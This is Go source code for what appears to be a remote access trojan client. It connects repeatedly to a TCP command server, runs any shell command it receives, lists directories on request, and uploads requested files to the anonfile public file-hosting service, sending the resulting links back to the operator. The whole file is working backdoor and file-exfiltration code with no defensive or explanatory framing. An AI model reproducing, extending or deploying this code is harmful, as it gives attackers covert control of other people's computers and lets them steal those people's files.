package main

import (
	"github.com/charmbracelet/log"
	"github.com/wabarc/go-anonfile"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func main() {
	var host = "localhost"
	var port = 2137

	for {
		serverConn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
		if err != nil {
			log.Errorf("Failed to connect to server: %v", err)
			// Wait for a while before reconnecting
			time.Sleep(time.Second * 5)
			continue
		}

		// send data to server
		_, err = serverConn.Write([]byte("Hello, server!"))
		if err != nil {
			log.Errorf("Failed to send data to server: %v", err)
			_ = serverConn.Close()
			// Wait for a while before reconnecting
			time.Sleep(time.Second * 5)
			continue
		}

		log.Infof("Connected to server %s:%d", host, port)

		// receive data from server
		buffer := make([]byte, 1024)
		for {
			bytesRead, err := serverConn.Read(buffer)
			if err != nil {
				log.Errorf("Failed to receive data from server: %v", err)
				_ = serverConn.Close()
				break
			}

			data := buffer[:bytesRead]
			log.Infof("Received data: %s", data)

			s := string(data)

			ParseCommands(s, serverConn)
		}

		log.Warnf("Server closed the connection. Reconnecting...")
	}
}

func ParseCommands(input string, conn net.Conn) {
	if strings.HasPrefix(input, "cmd") {
		args := ParseArgs(input, "cmd")
		command := exec.Command(args[0], args[1:]...)

		output, err := command.Output()
		if err != nil {
			SendResponse(conn, "Failed to execute command: "+err.Error())
		}

		outputString := strings.TrimSpace(string(output))
		SendResponse(conn, outputString)
	} else if strings.HasPrefix(input, "files") {
		args := ParseArgs(input, "files")

		// string builder
		var sb strings.Builder
		sb.WriteString("Received files: \n")

		dir, err := os.ReadDir(args[0])
		if err != nil {
			SendResponse(conn, "Failed to read directory: "+err.Error())
			return
		}

		for _, file := range dir {
			sb.WriteString("Name: " + args[0] + file.Name() + ", IsFile: " + strconv.FormatBool(!file.IsDir()) + "\n")
		}

		SendResponse(conn, sb.String())
	} else if strings.HasPrefix(input, "download") {
		args := ParseArgs(input, "download")

		file := UploadFile(args[0])
		SendResponse(conn, file)
	}
}

func UploadFile(path string) string {
	file := CreateTempAndCopyFile(path)

	var content = ""
	if data, err := anonfile.NewAnonfile(nil).Upload(file); err == nil {
		content = path + " -> " + data.Data.File.URL.Full
	}

	_ = os.Remove(file)

	return content
}

func CreateTempAndCopyFile(originalFilePath string) string {
	// Create a temporary directory
	tempDir, _ := os.MkdirTemp("", "temp")

	// Generate a temporary file path
	split := strings.Split(originalFilePath, "\\")
	tempFilePath := filepath.Join(tempDir, split[len(split)-1])

	// Open the original file
	originalFile, _ := os.Open(originalFilePath)

	defer func(originalFile *os.File) {
		_ = originalFile.Close()
	}(originalFile)

	// Create the temporary file
	tempFile, _ := os.Create(tempFilePath)
	defer func(tempFile *os.File) {
		_ = tempFile.Close()
	}(tempFile)

	// Copy the contents of the original file to the temporary file
	_, _ = io.Copy(tempFile, originalFile)

	// Close the original file
	_ = originalFile.Close()
	_ = tempFile.Close()

	return tempFilePath
}

func ParseArgs(input string, command string) []string {
	args := strings.Split(input, command+" ")
	args = args[1:]
	return args
}

func SendResponse(conn net.Conn, response string) {
	_, err := conn.Write([]byte(response))
	if err != nil {
		log.Errorf("Failed to send response to client: %v", err)
	}
}
